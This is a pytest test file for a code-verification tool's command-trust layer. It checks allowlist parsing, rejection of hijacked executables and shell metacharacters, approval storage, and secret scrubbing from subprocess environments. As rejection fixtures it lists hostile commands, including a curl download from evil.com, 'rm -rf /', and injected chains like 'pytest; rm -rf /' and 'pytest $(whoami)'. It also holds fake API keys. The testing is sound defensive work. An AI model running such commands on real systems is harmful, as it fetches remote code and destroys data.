from __future__ import annotations

import sys
from pathlib import Path

import pytest
from typer.testing import CliRunner

from sarthi.cli import app
from sarthi.core.models import ProjectConfig, RunContext, VerifyConfig
from sarthi.core.verify.runners.tests import TestRunner
from sarthi.core.verify.trust import (
    CommandTrustError,
    CommandTrustManager,
    DisallowedExecutableError,
    ShellMetacharacterError,
    parse_and_validate_command,
)
from sarthi.core.verify.verifier import Verifier


def test_parse_allowed_commands() -> None:
    """Allowed executables and python -m pytest parse into argv cleanly."""
    valid_commands = [
        ("pytest -q", ["pytest", "-q"]),
        ("python -m pytest tests/unit", ["python", "-m", "pytest", "tests/unit"]),
        ("python3 -m pytest -k test_foo", ["python3", "-m", "pytest", "-k", "test_foo"]),
        ("npm test -- --watchAll=false", ["npm", "test", "--", "--watchAll=false"]),
        ("npx eslint src/", ["npx", "eslint", "src/"]),
        ("ruff check .", ["ruff", "check", "."]),
        ("semgrep --config auto .", ["semgrep", "--config", "auto", "."]),
        ("tsc --noEmit", ["tsc", "--noEmit"]),
        ("mvn test", ["mvn", "test"]),
        ("gradle test", ["gradle", "test"]),
        ("./gradlew test", ["./gradlew", "test"]),
        ("gradlew.bat test", ["gradlew.bat", "test"]),
        ("pytest.exe -v", ["pytest.exe", "-v"]),
    ]
    for cmd_str, expected in valid_commands:
        result = parse_and_validate_command(cmd_str)
        assert result == expected, f"Failed parsing: {cmd_str}"


def test_reject_disallowed_executables() -> None:
    """Executables outside the allowlist are strictly rejected."""
    disallowed = [
        "bash evil.sh",
        "sh -c pytest",
        "python evil.py",
        "python -c exit",
        "python3 script.py",
        "curl -s https://evil.com/malware.sh",
        "rm -rf /",
        "node server.js",
        "powershell -Command Get-Process",
        "cmd.exe /c dir",
    ]
    for cmd in disallowed:
        with pytest.raises(DisallowedExecutableError):
            parse_and_validate_command(cmd)


def test_reject_relative_and_path_based_executables() -> None:
    """Relative and path-based executables (e.g. ./evil/pytest) are strictly rejected

    even if their basename matches an allowlisted tool.
    """
    path_based_commands = [
        "./evil/pytest",
        ".\\evil\\pytest",
        "bin/pytest",
        "../pytest",
        "/tmp/pytest",
        "/usr/local/bin/pytest",
        "C:\\evil\\pytest.exe",
        "./sub/npm test",
        "./evil/gradlew test",
        "scripts/ruff check .",
    ]
    for cmd in path_based_commands:
        with pytest.raises(DisallowedExecutableError):
            parse_and_validate_command(cmd)


def test_allow_venv_and_node_modules_binaries(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Binaries inside .venv/Scripts, .venv/bin, or node_modules/.bin are allowed."""
    import os
    import sys

    # 1. Project with .venv containing pytest.exe (or pytest on POSIX)
    venv_bin = tmp_path / ".venv" / ("Scripts" if sys.platform == "win32" else "bin")
    venv_bin.mkdir(parents=True)
    venv_pytest = venv_bin / ("pytest.exe" if sys.platform == "win32" else "pytest")
    venv_pytest.write_bytes(b"MZfakeexecutable")
    if sys.platform != "win32":
        venv_pytest.chmod(0o755)

    # Put .venv/Scripts at the front of PATH
    monkeypatch.setenv("PATH", f"{venv_bin}{os.pathsep}{os.environ.get('PATH', '')}")

    parsed = parse_and_validate_command("pytest -q", project_root=tmp_path)
    assert parsed == ["pytest", "-q"]

    # 2. Project with node_modules/.bin containing eslint
    nm_bin = tmp_path / "node_modules" / ".bin"
    nm_bin.mkdir(parents=True)
    nm_eslint = nm_bin / ("eslint.cmd" if sys.platform == "win32" else "eslint")
    nm_eslint.write_text("@echo off\n", encoding="utf-8")
    if sys.platform != "win32":
        nm_eslint.chmod(0o755)

    monkeypatch.setenv("PATH", f"{nm_bin}{os.pathsep}{os.environ.get('PATH', '')}")
    parsed_eslint = parse_and_validate_command("eslint src/", project_root=tmp_path)
    assert parsed_eslint == ["eslint", "src/"]


def test_allow_symlinked_python_in_venv(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """A symlink named 'python' inside .venv/bin pointing to a real python binary is accepted for python -m pytest."""
    import os
    import sys

    venv_bin = tmp_path / ".venv" / "bin"
    venv_bin.mkdir(parents=True)
    symlink_path = venv_bin / "python"

    real_python = Path(sys.executable).resolve()
    try:
        symlink_path.symlink_to(real_python)
    except (OSError, NotImplementedError):
        pytest.skip("Symlink creation not permitted or requires elevated privileges on this system")

    monkeypatch.setenv("PATH", f"{venv_bin}{os.pathsep}{os.environ.get('PATH', '')}")
    parsed = parse_and_validate_command("python -m pytest", project_root=tmp_path)
    assert parsed == ["python", "-m", "pytest"]


def test_reject_project_root_hijack_executable(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """A bare hijack executable placed directly in project root is rejected."""
    if sys.platform == "win32":
        # Windows: hijack pytest.bat in project root
        hijack_bat = tmp_path / "pytest.bat"
        hijack_bat.write_text("@echo off\necho evil\n", encoding="utf-8")

        with pytest.raises(DisallowedExecutableError, match="untrusted project directory"):
            parse_and_validate_command("pytest -q", project_root=tmp_path)

        # Rejection via cwd resolution when running inside project root
        monkeypatch.chdir(tmp_path)
        with pytest.raises(DisallowedExecutableError, match="untrusted project directory"):
            parse_and_validate_command("pytest -q")

        # Hijack pytest.exe in project root
        hijack_bat.unlink()
        hijack_exe = tmp_path / "pytest.exe"
        hijack_exe.write_bytes(b"MZfakeexecutable")

        with pytest.raises(DisallowedExecutableError, match="untrusted project directory"):
            parse_and_validate_command("pytest -q", project_root=tmp_path)
    else:
        # POSIX: hijack executable file named pytest in project root
        hijack_file = tmp_path / "pytest"
        hijack_file.write_text("#!/bin/sh\necho evil\n", encoding="utf-8")
        hijack_file.chmod(0o755)

        with pytest.raises(DisallowedExecutableError, match="untrusted project directory"):
            parse_and_validate_command("pytest -q", project_root=tmp_path)

        # Rejection via cwd resolution when running inside project root
        monkeypatch.chdir(tmp_path)
        with pytest.raises(DisallowedExecutableError, match="untrusted project directory"):
            parse_and_validate_command("pytest -q")

    trust_mgr = CommandTrustManager(config_dir=tmp_path / "user_config")
    with pytest.raises(CommandTrustError):
        trust_mgr.approve(tmp_path, {"test": "pytest -q"})


def test_reject_shell_metacharacters() -> None:
    """Commands with shell chaining, pipes, or expansions are strictly rejected."""
    metachar_commands = [
        "pytest; rm -rf /",
        "pytest && echo evil",
        "pytest || echo fallback",
        "pytest | grep passed",
        "pytest > out.txt",
        "pytest < in.txt",
        "pytest $(whoami)",
        "pytest `id`",
        "pytest\npytest",
        "pytest (echo subshell)",
    ]
    for cmd in metachar_commands:
        with pytest.raises(ShellMetacharacterError):
            parse_and_validate_command(cmd)


def test_reject_empty_command() -> None:
    """Empty or whitespace-only commands are rejected."""
    with pytest.raises(CommandTrustError):
        parse_and_validate_command("")
    with pytest.raises(CommandTrustError):
        parse_and_validate_command("   ")


def test_command_trust_manager_approval_lifecycle(tmp_path: Path) -> None:
    """Approvals are stored in user config dir and can be checked and revoked."""
    user_config_dir = tmp_path / "user_home" / ".sarthi"
    project_root = tmp_path / "my_project"
    project_root.mkdir(parents=True)

    trust_mgr = CommandTrustManager(config_dir=user_config_dir)
    commands = {"test": "pytest -q", "lint": "ruff check ."}

    # 1. Untrusted by default
    assert trust_mgr.is_approved(project_root, commands) is False

    # 2. Approve
    cmd_hash = trust_mgr.approve(project_root, commands)
    assert len(cmd_hash) == 64  # SHA-256 hex
    assert trust_mgr.is_approved(project_root, commands) is True

    # 3. New manager reading same file sees approval
    fresh_mgr = CommandTrustManager(config_dir=user_config_dir)
    assert fresh_mgr.is_approved(project_root, commands) is True

    # 4. Revoke
    revoked = trust_mgr.revoke(project_root)
    assert revoked is True
    assert trust_mgr.is_approved(project_root, commands) is False
    assert fresh_mgr.is_approved(project_root, commands) is False


def test_command_trust_manager_invalidates_on_command_change(tmp_path: Path) -> None:
    """Modifying, adding, or removing commands invalidates existing approval."""
    user_config_dir = tmp_path / "user_home" / ".sarthi"
    project_root = tmp_path / "my_project"
    project_root.mkdir(parents=True)

    trust_mgr = CommandTrustManager(config_dir=user_config_dir)
    original_commands = {"test": "pytest -q"}
    trust_mgr.approve(project_root, original_commands)
    assert trust_mgr.is_approved(project_root, original_commands) is True

    # Modified command string
    tampered_commands = {"test": "pytest -q --evil-flag"}
    assert trust_mgr.is_approved(project_root, tampered_commands) is False

    # Added command
    extended_commands = {"test": "pytest -q", "lint": "ruff check ."}
    assert trust_mgr.is_approved(project_root, extended_commands) is False

    # Empty commands
    assert trust_mgr.is_approved(project_root, {}) is True  # Empty needs no approval


def test_command_trust_manager_refuses_to_approve_disallowed(tmp_path: Path) -> None:
    """Manager refuses to approve commands containing disallowed binaries or metacharacters."""
    trust_mgr = CommandTrustManager(config_dir=tmp_path)
    with pytest.raises(CommandTrustError):
        trust_mgr.approve(tmp_path, {"test": "python evil.py"})

    with pytest.raises(CommandTrustError):
        trust_mgr.approve(tmp_path, {"test": "pytest; evil"})


def test_test_runner_skips_untrusted_command(tmp_path: Path) -> None:
    """TestRunner marks untrusted custom test command as untrusted."""
    user_config_dir = tmp_path / ".sarthi"
    trust_mgr = CommandTrustManager(config_dir=user_config_dir)

    runner = TestRunner(trust_mgr=trust_mgr)
    ctx = RunContext(
        project_root=tmp_path,
        config=ProjectConfig(
            verify=VerifyConfig(commands={"test": "pytest -q"})
        ),
    )

    trusted, reason = runner.check_trust(ctx)
    assert trusted is False
    assert "untrusted" in (reason or "").lower()
    assert runner.available(ctx) is False


def test_verifier_skips_untrusted_command_with_actionable_hint(tmp_path: Path) -> None:
    """Verifier skips untrusted custom test command with instruction on how to approve."""
    user_config_dir = tmp_path / "user_home" / ".sarthi"
    project_root = tmp_path / "repo"
    project_root.mkdir(parents=True)

    # Create dummy project.yaml with custom test command
    sarthi_dir = project_root / ".sarthi"
    sarthi_dir.mkdir()
    (sarthi_dir / "project.yaml").write_text(
        "version: 1\nverify:\n  commands:\n    test: pytest -q\n",
        encoding="utf-8",
    )

    trust_mgr = CommandTrustManager(config_dir=user_config_dir)
    verifier = Verifier(project_root, trust_mgr=trust_mgr)
    report = verifier.verify()

    assert report.status == "incomplete"
    skipped_checks = [s.check for s in report.skipped]
    assert "tests" in skipped_checks

    test_skip = next(s for s in report.skipped if s.check == "tests")
    assert "untrusted" in test_skip.reason.lower()
    assert "sarthi approve" in test_skip.reason


def test_verifier_runs_custom_command_after_approval(tmp_path: Path) -> None:
    """Verifier executes custom command once approved."""
    user_config_dir = tmp_path / "user_home" / ".sarthi"
    project_root = tmp_path / "repo"
    project_root.mkdir(parents=True)

    sarthi_dir = project_root / ".sarthi"
    sarthi_dir.mkdir()
    (sarthi_dir / "project.yaml").write_text(
        "version: 1\nverify:\n  commands:\n    test: pytest -q\n",
        encoding="utf-8",
    )

    trust_mgr = CommandTrustManager(config_dir=user_config_dir)
    # Approve the commands
    trust_mgr.approve(project_root, {"test": "pytest -q"})

    verifier = Verifier(project_root, trust_mgr=trust_mgr)
    report = verifier.verify()

    # The test check should not be skipped for trust reasons
    untrusted_skips = [s for s in report.skipped if "untrusted" in s.reason.lower()]
    assert len(untrusted_skips) == 0


def test_default_test_suite_requires_approval(tmp_path: Path) -> None:
    """Approval covers ANY execution of project test commands, including default ones."""
    user_config_dir = tmp_path / "user_home" / ".sarthi"
    project_root = tmp_path / "repo"
    project_root.mkdir(parents=True)

    # Project with default test framework detected (test_app.py) but NO custom commands in project.yaml
    (project_root / "test_app.py").write_text("def test_ok(): pass\n", encoding="utf-8")

    trust_mgr = CommandTrustManager(config_dir=user_config_dir)
    verifier = Verifier(project_root, trust_mgr=trust_mgr)
    report = verifier.verify()

    # Must be incomplete and skipped because default test execution is unapproved
    assert report.status == "incomplete"
    test_skip = next((s for s in report.skipped if s.check == "tests"), None)
    assert test_skip is not None
    assert "unapproved" in test_skip.reason.lower()
    assert "pytest" in test_skip.reason.lower()

    # Once approved via trust manager, execution is allowed
    trust_mgr.approve(project_root, {"test": "pytest -q"})
    approved_report = verifier.verify()
    unapproved_test_skips = [
        s for s in approved_report.skipped if s.check == "tests" and "unapproved" in s.reason.lower()
    ]
    assert len(unapproved_test_skips) == 0


def test_cli_approve_refuses_when_stdin_not_a_tty(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """`sarthi approve` must refuse execution with non-zero exit when stdin is not a TTY."""
    # Under CliRunner, sys.stdin is not a TTY by default
    runner = CliRunner()
    result = runner.invoke(app, ["approve", str(tmp_path)])
    assert result.exit_code != 0
    assert "requires an interactive terminal (TTY)" in result.stdout


def test_cli_approve_interactive_confirmation(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """`sarthi approve` prompts on interactive TTY: rejects on 'n', approves on 'y'."""
    monkeypatch.setattr("sarthi.cli._is_interactive_tty", lambda: True)

    # Set user home so approvals write to tmp_path
    fake_home = tmp_path / "user_home"
    monkeypatch.setenv("HOME", str(fake_home))
    monkeypatch.setenv("USERPROFILE", str(fake_home))

    project_root = tmp_path / "my_project"
    project_root.mkdir()
    (project_root / "test_app.py").write_text("def test_foo(): pass\n", encoding="utf-8")

    runner = CliRunner()

    # 1. User answers 'n' -> aborts with non-zero exit, not approved
    res_no = runner.invoke(app, ["approve", str(project_root)], input="n\n")
    assert res_no.exit_code != 0
    assert "Approval cancelled" in res_no.stdout

    trust_mgr = CommandTrustManager(config_dir=fake_home / ".sarthi")
    assert trust_mgr.is_approved(project_root, {"test": "pytest -q"}) is False

    # 2. User answers 'y' -> succeeds (exit 0), approved
    res_yes = runner.invoke(app, ["approve", str(project_root)], input="y\n")
    assert res_yes.exit_code == 0
    assert "Successfully approved test command(s)" in res_yes.stdout
    assert trust_mgr.is_approved(project_root, {"test": "pytest -q"}) is True


def test_build_sanitized_subprocess_env_strips_secrets(tmp_path: Path) -> None:
    """Verifies that subprocess environment scrubbing completely removes all API keys and secrets."""
    from sarthi.core.verify.trust import build_sanitized_subprocess_env

    dirty_env = {
        "PATH": "C:\\Windows\\System32;C:\\Python313",
        "SYSTEMROOT": "C:\\Windows",
        "ANTHROPIC_API_KEY": "sk-ant-sensitive123456",
        "GEMINI_API_KEY": "AIzaSySensitive789",
        "OPENAI_API_KEY": "sk-proj-supersecret",
        "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "GITHUB_TOKEN": "ghp_1234567890abcdef",
        "DATABASE_PASSWORD": "mypassword123",
        "SSH_AUTH_SOCK": "/tmp/ssh.sock",
        "RANDOM_USER_TOKEN": "tok_abcdef",
        "TEMP": "C:\\Temp",
    }

    clean_env = build_sanitized_subprocess_env(tmp_path, base_env=dirty_env)

    # Allowlisted variables preserved
    assert clean_env["PATH"] == dirty_env["PATH"]
    assert clean_env["SYSTEMROOT"] == dirty_env["SYSTEMROOT"]
    assert clean_env["TEMP"] == dirty_env["TEMP"]
    assert clean_env["PYTHONPATH"] == str(tmp_path.resolve())
    assert clean_env["PYTHONDONTWRITEBYTECODE"] == "1"

    # All credentials and keys strictly scrubbed
    assert "ANTHROPIC_API_KEY" not in clean_env
    assert "GEMINI_API_KEY" not in clean_env
    assert "OPENAI_API_KEY" not in clean_env
    assert "AWS_SECRET_ACCESS_KEY" not in clean_env
    assert "GITHUB_TOKEN" not in clean_env
    assert "DATABASE_PASSWORD" not in clean_env
    assert "SSH_AUTH_SOCK" not in clean_env
    assert "RANDOM_USER_TOKEN" not in clean_env


def test_test_runner_subprocess_strips_secrets(tmp_path: Path, monkeypatch) -> None:
    """Verifies that TestRunner executes tests under a sanitized environment without provider keys."""
    # Seed secrets in the host environment
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-should-never-leak")
    monkeypatch.setenv("OPENAI_API_KEY", "sk-openai-should-never-leak")
    monkeypatch.setenv("SUPER_SECRET_TOKEN", "sensitive-token-val")

    project_dir = tmp_path / "test_proj"
    project_dir.mkdir()
    (project_dir / "tests").mkdir()

    # The test asserts that secrets are NOT present in its os.environ
    test_file = project_dir / "tests" / "test_env_isolation.py"
    test_file.write_text(
        "import os\n"
        "def test_secrets_not_inherited():\n"
        "    assert 'ANTHROPIC_API_KEY' not in os.environ\n"
        "    assert 'OPENAI_API_KEY' not in os.environ\n"
        "    assert 'SUPER_SECRET_TOKEN' not in os.environ\n",
        encoding="utf-8",
    )

    trust_mgr = CommandTrustManager(config_dir=tmp_path / "trust_store")
    trust_mgr.approve(project_dir, {"test": "pytest -q"})

    runner = TestRunner(trust_mgr=trust_mgr)
    ctx = RunContext(
        project_root=project_dir,
        config=ProjectConfig(project_name="test_proj"),
        active_layers=["universal"],
        task="verify",
        task_type="test",
        all_rules=[],
    )

    findings = runner.run(ctx, [])
    # If secrets leaked, the assertion failed and created a finding
    assert len(findings) == 0, f"Test failed with finding: {findings[0].message if findings else ''}"


def test_eslint_runner_subprocess_sanitizes_environment(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Verifies SEC-01B: ESLintRunner passes a sanitized environment devoid of provider credentials."""
    import subprocess

    from sarthi.core.verify.runners.eslint import ESLintRunner

    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-sensitive-leak-test")
    monkeypatch.setenv("OPENAI_API_KEY", "sk-proj-sensitive-leak-test")
    monkeypatch.setenv("GEMINI_API_KEY", "AIzaSySensitiveGeminiKey")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY")

    project_dir = tmp_path / "js_proj"
    project_dir.mkdir()
    js_file = project_dir / "index.js"
    js_file.write_text("console.log('test');\n", encoding="utf-8")

    captured_env: dict[str, str] = {}

    def mock_subprocess_run(cmd, **kwargs):
        nonlocal captured_env
        captured_env = kwargs.get("env", {})
        return subprocess.CompletedProcess(cmd, 0, stdout="[]", stderr="")

    monkeypatch.setattr("subprocess.run", mock_subprocess_run)

    runner = ESLintRunner()
    # Stub binary check to return a simulated eslint
    monkeypatch.setattr(runner, "_find_binary", lambda ctx: ["eslint"])

    ctx = RunContext(
        project_root=project_dir,
        config=ProjectConfig(project_name="js_proj"),
        active_layers=["react"],
        task="verify",
        task_type="lint",
        all_rules=[],
    )

    runner.run(ctx, [js_file])

    assert captured_env is not None
    assert len(captured_env) > 0
    # Provider secrets and tokens must be completely scrubbed
    assert "ANTHROPIC_API_KEY" not in captured_env
    assert "OPENAI_API_KEY" not in captured_env
    assert "GEMINI_API_KEY" not in captured_env
    assert "AWS_SECRET_ACCESS_KEY" not in captured_env
    # Essential runtime variables must remain
    assert "PATH" in captured_env
    if sys.platform == "win32":
        assert "SYSTEMROOT" in captured_env


def test_semgrep_runner_subprocess_sanitizes_environment(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Verifies SEC-01B: SemgrepRunner passes a sanitized environment devoid of provider credentials."""
    import subprocess

    from sarthi.core.verify.runners.semgrep import SemgrepRunner

    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-sensitive-leak-test")
    monkeypatch.setenv("OPENAI_API_KEY", "sk-proj-sensitive-leak-test")
    monkeypatch.setenv("GEMINI_API_KEY", "AIzaSySensitiveGeminiKey")
    monkeypatch.setenv("GITHUB_TOKEN", "ghp_1234567890abcdef")

    project_dir = tmp_path / "py_proj"
    project_dir.mkdir()
    py_file = project_dir / "app.py"
    py_file.write_text("x = 1\n", encoding="utf-8")

    rule_file = project_dir / "rule.yaml"
    rule_file.write_text("rules: []\n", encoding="utf-8")

    captured_envs: list[dict[str, str]] = []

    def mock_subprocess_run(cmd, **kwargs):
        captured_envs.append(kwargs.get("env", {}))
        return subprocess.CompletedProcess(cmd, 0, stdout='{"results": []}', stderr="")

    monkeypatch.setattr("subprocess.run", mock_subprocess_run)

    runner = SemgrepRunner()
    monkeypatch.setattr(runner, "available", lambda ctx: True)
    monkeypatch.setattr(runner, "_get_rule_configs", lambda ctx: [rule_file])

    ctx = RunContext(
        project_root=project_dir,
        config=ProjectConfig(project_name="py_proj"),
        active_layers=["universal"],
        task="verify",
        task_type="lint",
        all_rules=[],
    )

    runner.run(ctx, [py_file])

    assert len(captured_envs) > 0
    for env in captured_envs:
        assert "ANTHROPIC_API_KEY" not in env
        assert "OPENAI_API_KEY" not in env
        assert "GEMINI_API_KEY" not in env
        assert "GITHUB_TOKEN" not in env
        assert "PATH" in env
        if sys.platform == "win32":
            assert "SYSTEMROOT" in env


